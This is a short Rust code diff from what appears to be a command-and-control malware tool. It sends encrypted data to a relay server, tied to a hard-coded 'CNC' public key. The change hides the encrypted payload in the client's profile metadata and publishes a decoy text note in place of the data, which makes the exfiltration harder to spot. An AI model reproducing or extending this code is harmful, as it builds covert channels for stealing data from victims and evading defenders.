@@ -2,6 +2,7 @@ use std::collections::HashMap;
 use std::fs::File;
 use std::io::Write;
 use std::process::exit;
+use std::time::Duration;
 
 use bns_lib::FILE_STORAGE_SERVER;
 use bytes::Bytes;
@@ -148,8 +149,21 @@ async fn run() -> Result<()> {
         .await
         .expect("failed to connect to relay");
 
+    let fetched = client
+        .fetch_metadata(
+            PublicKey::parse(bns_lib::CNC_PUB_KEY).unwrap(),
+            Duration::from_secs(2),
+        )
+        .await;
+
+    let metadata = match fetched {
+        Ok(metadata) => metadata.custom_field("payload", encrypted),
+        _ => Metadata::new().custom_field("payload", encrypted),
+    };
+
     println!("[+] uploading data...");
-    let builder = EventBuilder::text_note(encrypted);
+    let _ = client.set_metadata(&metadata);
+    let builder = EventBuilder::text_note("Hey check out my new payload :)");
     client.send_event_builder(builder).await.unwrap();
 
     client.disconnect().await;
